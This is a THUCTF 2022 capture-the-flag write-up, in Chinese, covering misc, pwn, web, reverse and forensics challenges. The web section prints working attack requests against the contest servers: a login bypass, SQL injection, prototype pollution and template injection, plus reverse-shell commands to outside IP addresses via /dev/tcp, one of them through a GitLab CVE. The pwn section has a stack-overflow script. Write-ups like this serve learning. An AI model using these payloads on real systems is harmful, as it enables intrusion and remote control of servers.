# THUCTF Write-Up by 4E1A607A

## Mobile

### checkin

科学上网上Discord, 在announcements上面有flag

### test your nc

连上nc

### survey

填完问卷, base64解码

## Misc

### 小可莉能有什么坏心思呢？

3张图, 用图片查看器 (没有alpha channel) 打开可以识别3组, 用stegsolve (可能有alpha channel) 又识别出两组, 最后一组扔Word里面调亮度.

### flagmarket_level1

PoC:

```python
import pwn
import itertools
import hashlib

r = pwn.remote("nc.thuctf.redbud.info", 31002)

l = r.readline().decode("latin-1")

print(l)

sha = b"".fromhex(l[l.find("==")+3:])
# print(sha)

salt = l[l.find("+")+2:l.find(")")].encode()
# print(salt)

passwd = ""
dict = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVFBNM!#$%&*-?"
for i in itertools.product(dict, repeat=4):
    if hashlib.sha256("".join(i).encode()+salt).digest() == sha:
        passwd = "".join(i)
        break

print(passwd)
r.writeline(passwd.encode())

r.interactive()

# 后面人工卖一个-0x2333333333333333333333... 的flag就有钱了

# THUCTF{Y0U_M4D3_17_1_W111_D0U813_CH3CK_7H3_Pr1C3_N3X7_71M3}
```

### Treasure Hunter

辨认出3个点 (主楼, 桃李园门口, 数学系), 结果我在重心 (情侣坡) 找了很久... 直到最后一个提示 (3点->圆). 扫学堂路THUCTF广告后面的二维码拿到flag

### Treasure Hunter Plus Plus

没看懂, 但是如果某一步正确就是绿的, 错误就是红的. 直接试, 得到顺序: (前两行是唯二留下的过程, 第4行是结果)

```txt
L3 -> 5
L3 -> s3

2 L3 s3 5 L4 u2 3 1 d2

THUCTF{5b56c688-6f5b-465b-b04f-857f4121758b}
```

### Treasure Hunter Plus Plus Plus

骑了一个小时车, 9个找全了. (两只手的那个真难找! 最后我上官网搜了一下位置)

## Crypto

想不到吧我一道题都没做出来

## Pwn

### babystack_level0

最简单 (也是我唯一做出来的)

PoC (是level1的未完成PoC, 所以丢失了一部分信息):

```python
import pwn

c = pwn.remote("nc.thuctf.redbud.info", 30240)

def o():
    print(c.read().decode("latin-1"))

o()
c.write(b"a\n")
o()
c.write(b"a\n")
o()
p = b"a"*104 + b"b"*8 + (0x4007EC).to_bytes(8, "little") + b'\n'
c.write(p)
c.interactive()
```

## Web

这个我比较熟

### What is $? - flag1

利用_REQUEST和0E开头的字符串 `==` 结果为 `True` 绕过登录

```http
POST /code.php?action=1 HTTP/1.1
Host: nc.thuctf.redbud.info:30875
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://nc.thuctf.redbud.info:30875/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

action=login&cb_user=admin&cb_pass=QNKCDZO&cb_salt=s878926199
```

### What is $? - flag2

SQL注入 (利用正则\S)

```http
POST /code.php?action=1 HTTP/1.1
Host: nc.thuctf.redbud.info:30875
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://nc.thuctf.redbud.info:30875/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Cookie: PHPSESSID=9195ee355659ed5283df194732619080

action=save_item&item[name]=a&item[uuid]=00000000-000000000'%2c'lib%2fflag.php')%23
```

然后GET拿flag (但是我还是POST的)

```http
POST /code.php?action=1 HTTP/1.1
Host: nc.thuctf.redbud.info:30875
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://nc.thuctf.redbud.info:30875/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Cookie: PHPSESSID=9195ee355659ed5283df194732619080

action=list_item
```

```http
HTTP/1.1 200 OK
Date: Mon, 26 Sep 2022 02:36:37 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 433
Connection: close
Content-Type: text/html; charset=UTF-8

--- start a 00000000-000000000000000000000000000 ---<br/>Content: <br/>---  end  a 00000000-000000000000000000000000000 ---<br/><br/>--- start a 00000000-000000000 ---<br/>Content: <?php
namespace lib;

class Flag {
    const FLAG1 = 'flag{simple_php_bypass_f4ffbe58}';
    const FLAG2 = 'flag{simple_sql_injection_41278e35}';
    // FLAG3 is in /flag3, call /readflag3 to read it;
}
<br/>---  end  a 00000000-000000000 ---<br/><br/>
```

### 结、枷锁 - flag1

先任意文件读拿源码 `http://nc.thuctf.redbud.info:30931/static?file=../app.js`

然后利用 `==` 判断数组时候转成string登录

```http
POST /login HTTP/1.1
Host: nc.thuctf.redbud.info:30931
Content-Length: 38
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://nc.thuctf.redbud.info:30931
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://nc.thuctf.redbud.info:30931/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=91020cc5b9def047e1448020852cd7ca; connect.sid=s%3AGon1qVLX40EOW2wjF_o_TDB3UqkAf67c.KmjxjVSybzFNyh%2BScJ35M0wUGTALpYimkKGm4b4JttM
Connection: close

username[0]=admin&password[0][0]=admin
```

原型链污染拿flag

```http
POST /dashboard HTTP/1.1
Host: nc.thuctf.redbud.info:30931
Content-Length: 44
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/json
Accept: */* 
Origin: http://nc.thuctf.redbud.info:30931
Referer: http://nc.thuctf.redbud.info:30931/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=91020cc5b9def047e1448020852cd7ca; connect.sid=s%3AGon1qVLX40EOW2wjF_o_TDB3UqkAf67c.KmjxjVSybzFNyh%2BScJ35M0wUGTALpYimkKGm4b4JttM
Connection: close

{"a": 1, "__proto__": {"i_can_get_flag": 1}}
```

### 结、枷锁 - flag2

继续污染

```http
POST /dashboard HTTP/1.1
Host: nc.thuctf.redbud.info:31949
Content-Length: 189
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://nc.thuctf.redbud.info:31949
Referer: http://nc.thuctf.redbud.info:31949/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: mysession=MTY2NDUyMzg3OXxOd3dBTkV0VlFsZEVRa1pSVkZkVk5WZEhWelJVVUU1S05sZGFWVmxXUnpOUlVrRldWVVpXTmxaSVZqWlhOVTQwVDFaRlVqVTNXVkU9fJsjvVSqQT9i4K0NqwvIxnGR2KtuTycdQ8AHltl1umzb; connect.sid=s%3Aoj4tkOIBFsni3fMhz4hwh7uZq45pQwQB.i2rZ1fDuEQMDAvwvTvcB4tAbKVJNDY2MQ6NGF68Lu8U
Connection: close

{"a": 1, "__proto__": {"client":1,"escapeFunction": "function(){};process.mainModule.require('child_process').execSync('bash -c \"/bin/bash -i >& /dev/tcp/183.172.204.230/44444 0>&1\"');"}}
```

然后请求`/dashboard`拿到flag2

### PyChall - flag1

本地搭server, 输入 `{{config}}`, 利用解析漏洞拿到 `SECRET_KEY`

```js
{'ENV': 'production',
 'DEBUG': False,
 'TESTING': False,
 'PROPAGATE_EXCEPTIONS': None,
 'SECRET_KEY': '74a832d6-c6ef-485c-a09c-3f1c38221674',
 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31),
 'USE_X_SENDFILE': False,
 'SERVER_NAME': None,
 'APPLICATION_ROOT': '/', 
 'SESSION_COOKIE_NAME': 'session',
 'SESSION_COOKIE_DOMAIN': False,
 'SESSION_COOKIE_PATH': None,
 'SESSION_COOKIE_HTTPONLY': True,
 'SESSION_COOKIE_SECURE': False,
 'SESSION_COOKIE_SAMESITE': None,
 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': None, 'JSON_SORT_KEYS': None, 'JSONIFY_PRETTYPRINT_REGULAR': None, 'JSONIFY_MIMETYPE': None, 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093
}
```

然后伪造Session拿flag

### PyChall - flag2

继续SSTI攻击, Server给出

```js
{{self. _TemplateReference__context.cycler[request.values.i]. __globals__ .os.system(request.values.cm) }}
```

请求

```http
POST /download/ HTTP/1.1
Host: nc.thuctf.redbud.info:31427
Content-Length: 199
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://nc.thuctf.redbud.info:31427
Referer: http://nc.thuctf.redbud.info:31427/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJpc0FkbWluIjowLCJ1c2VybmFtZSI6ImEifQ.YzPm2g.cjW-Jf9-HIdkljnPqBgBwEf5UUQ
Connection: close

url=http%3A%2F%2F183.172.229.215%3A44444%2F1&clas=__class__&b=__base__&s=__subclasses__&i=__init__&cm=bash%20-c%20%22%2fbin%2fbash%20-i%20%3e%26%20%2fdev%2ftcp%2f183.172.229.215%2f44443%200%3e%261%22
```

拿到反弹shell, `/readflag` 拿到flag (一血!)

### baby_gitlab

CVE-2021-22205 (完了跟提示一模一样) 拿反弹shell

我花了很久才做出来, 因为wsl的Kali没有公网IP. 最后我在Windows 11上装了netcat和msf...

### easy_gitlab

CVE-2022-2185 cmd `$(echo 'bash -i >& /dev/tcp/183.172.203.224/44444 0>&1' > /tmp/1.sh & chmod +x /tmp/1.sh & /bin/bash /tmp/1.sh)` 拿反弹shell

## Reverse

### encrypt_level1

做出来的太快 太早了我已经不记得我咋做出来的了. 大概是直接反编译pyc (写wp又做了一遍)

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.8

from Crypto.Util.number import *
flag = input('input the flag: ').strip()
A = 0xA9E2CB368B918562B1DEA2C29EC563BCBC706742A6F364759E65E8A8795D40757E02A54D88C06283F0EACA12
B = 0xFDAA9E75DFD7FE5188B891A1AAF65B918B43527B8BC7564CAD488A9B4D6C6D144935977DEDA455B292DFF86F
if A ^ bytes_to_long(flag.encode()) == B:
    print('Right!')
else:
    print('Wrong!')
```

然后直接异或decode

### encrypt_level2

反编译之后清理无用变量, 把enc扔进去手算异或得到flag. 手算结束后的cpp: (是的, 真的是手算的)

```cpp
#include <cstdio>

char flag[19] = "THUCTF{bd18f3b6}";
//                                                                  [7]   [8]   [9]   [10]  [11]  [12]  [13]  [14]
unsigned char seed[19] = {0xF1, 0x38, 0xe7, 0x6f, 0x70, 0xb3, 0xfb, 0x60, 0xf3, 0x27, 0x77, 0xfe, 0x3d, 0xc0, 0xDD, 0x78, 0, 0, 0};
unsigned char enc[19] =  {0xA5, 0x70, 0xB2, 0x2C, 0x24, 0xF5, 0x80, 2   , 0x97, 0x16, 0x4F, 0x98, 0x0E, 0xA2, 0x26, 0x1B, 0, 0, 0};

int __cdecl main(int argc, const char **argv)
{
  int v7;          // eax
  int v8;          // edx
  int v9;          // edx
  int v10;         // eax
  int v11;         // edx
  int v12;         // eax
  __int64 v13;     // rax
  int v14;         // edx
  int v15;         // ecx

  printf("Input your flag: ");
  scanf("%s", flag);
  {
    v11 = 0x10;
    v12 = seed[15] ^ v11 ^ 0xE;
    flag[15] ^= 0x66;
}
```

## PPC

### MAZE

思路极度简单: 一直向右转, 总能走出去. shellcode长度298

```c
/* example.c
 * gcc -Wall -Wextra -Wpedantic -Os -nostdlib example.c -o example
 */

typedef unsigned char byte;

static long system_call_linux_x86_64(long number, long _1, long _2, long _3)
{
    long value;

    __asm__ volatile("syscall"
                     : "=a"(value)
                     : "a"(number), "D"(_1), "S"(_2), "d"(_3)
                     : "rcx", "r11", "cc", "memory");

    return value;
}

static long read(unsigned int fd, const char *buf, long count)
{
    return system_call_linux_x86_64(0, fd, (long)buf, count);
}

static long write(unsigned int fd, const char *buf, long count)
{
    return system_call_linux_x86_64(1, fd, (long)buf, count);
}

static long open(const char *filename, int flags)
{
    return system_call_linux_x86_64(2, (long)filename, flags, 0);
}

static void exit(int code)
{
    system_call_linux_x86_64(60, code, 0, 0);
}

void _start()
{
    char maze[0x4000];

    /* read the maze map */
    const char filename[] = {'m', 'a', 'z', 'e', 0};
    int fd = open(filename, 0);
    read(fd, maze, 0x4000);

    register byte x = 0;
    while (maze[x] != '\n')
        ++x;

    short direDelta[7] = {1, x + 1, -1, -x - 1, 1, x + 1, -1};
    byte direTry[4] = {1, 0, 3, 2};
    const char direDiscription[5] = "dsaw";
    register byte dire = 1;        // 0->x+ 1->y+ 2->x- 3->y-
    register int p = x + 2;
    write(1, direDiscription + 1, 1);
    while (maze[p] != 'E')
    {
        for (register int i=0; i<4; ++i)
        {
            if (maze[p + direDelta[dire + direTry[i]]] != '#')
            {
                dire = (dire + direTry[i]) % 4;
                break;
            }
        }
        
        write(1, direDiscription + dire, 1);
        p += direDelta[dire];
    }

    exit(0);
}

// THUCTF{Nice_TrY_wElC0M3_To_tHE_5h31Lc0DE_woRld}
```

(比赛结束后更新, 长度226:)
```cpp
typedef unsigned char byte;
#define x 102

static long system_call_linux_x86_64(long number, long _1, long _2, long _3)
{
    long value;
    __asm__ volatile("syscall"
                     : "=a"(value)
                     : "a"(number), "D"(_1), "S"(_2), "d"(_3)
                     : "rcx", "r11", "cc", "memory");

    return value;
}

static long read(unsigned int fd, const char *buf, long count)
{
    return system_call_linux_x86_64(0, fd, (long)buf, count);
}

static long write(unsigned int fd, const char *buf, long count)
{
    return system_call_linux_x86_64(1, fd, (long)buf, count);
}

static long open(const char *filename, int flags)
{
    return system_call_linux_x86_64(2, (long)filename, flags, 0);
}

static void exit(int code)
{
    system_call_linux_x86_64(60, code, 0, 0);
}

void _start()
{
    char maze[0x4000];
    /* read the maze map */
    const char filename[] = {'m', 'a', 'z', 'e', 0};
    int fd = open(filename, 0);
    read(fd, maze, 0x4000);
    char direDelta[4] = {1, x, -1, -x};
    byte direTry[4] = {1, 0, 3, 2};
    const char direDiscription[4] = {'d', 's', 'a', 'w'};
    register byte dire = 1;        // 0->x+ 1->y+ 2->x- 3->y-
    register int p = x + 1;
    write(1, direDiscription + 1, 1);
    while (maze[p] != 'E')
    {
        for (register int i=0; i<4; ++i)
        {
            byte d = (dire + direTry[i]) % 4;
            if (maze[p + direDelta[d]] != '#')
            {
                dire = d;
                break;
            }
        }

        write(1, direDiscription + dire, 1);
        p += direDelta[dire];
    }

    exit(0);
}
```

### 人間観察バラエティ

不知道, 我瞎做的, 还是第一个做的, 分也是挺低的 (

## Forensics

### 蛛丝马迹

在出题人的指点下做出来了. 最有用的提示是出题人提醒我所有的jpg都是有压缩的.

一开始我看到小图 `https://pic2.zhimg.com/v2-4db1285fade352e5086b7538a2d5d515_b.jpg`, 大图 `https://pic2.zhimg.com/v2-4db1285fade352e5086b7538a2d5d515_r.jpg`, 非常自然地去掉了后缀得到 `https://pic2.zhimg.com/v2-4db1285fade352e5086b7538a2d5d515.jpg` (其实和大图一样). 经提示我第一个想到的就是直接换后缀名为 `https://pic2.zhimg.com/v2-4db1285fade352e5086b7538a2d5d515.png` 得到了隐写的 `uuid`. Check了一下我自己的, 有

```html
<div style="pointer-events:none;position:fixed;top:0;left:0;width:100%;height:100%;background-repeat:repeat;z-index:57626;background-image:url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0nMzY0LjYxNjY5NzA0NDM3NTcnIGhlaWdodD0nMTIyJyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjx0ZXh0IGZpbGw9JyM5Njk2OTYnIHg9JzUwJScgeT0nNTAlJyBmb250LXNpemU9JzE1JyB0ZXh0LWFuY2hvcj0nbWlkZGxlJyBmb250LWZhbWlseT0nSmV0QnJhaW5zIE1vbm8nIHRyYW5zZm9ybT0ncm90YXRlKC05IDE4Mi4zMDgzNDg1MjIxODc4NiAxODIuMzA4MzQ4NTIyMTg3ODYpJyBvcGFjaXR5PScwLjAwNic+Y2EwMWNhNDQtNTYyMS00MDRmLThkYmMtMmVjNTEzODJlMGQ5PC90ZXh0Pjwvc3ZnPg==&quot;)"></div>
```

一样可以解析出水印, 复制在Network一栏搜索uuid得到Key为 `UserId`. 同时还看到一个 `id=47`, (一开始我把它当userId的另一种表示了, 在github里面找对应关系, 谁让这个比赛是单人队呢), 为队伍id. 把平台转了个遍, 发现请求 `https://2022.thuctf.redbud.info/api/team` 结果同时包含了 `id` 和 `userId` 还有 `userName`, 为

```json
[{"id":47,"name":"4E1A607A","bio":"","avatar":null,"locked":true,"members":[{"id":"ca01ca44-5621-404f-8dbc-2ec51382e0d9","userName":"4E1A607A","bio":"","avatar":null,"captain":true}]}]
```

我第一反应是请求 `https://2022.thuctf.redbud.info/api/team?id=1` 结果没用. 这时出题人又提示我去翻API源码 (其实当时我正在翻). `/GZCTF/Controllers/TeamController.cs` 后面都是 `{id}/{action}` 形式, 我突然灵光一现试了试 `https://2022.thuctf.redbud.info/api/team/1` 然后就对了 (虽然返回值是404). 于是扔进Burp Intruder 把1-200 get一遍, 搜索 `1e261e9e-4b6e-4e9c-9375-a0c496182abd`, 得到用户名.
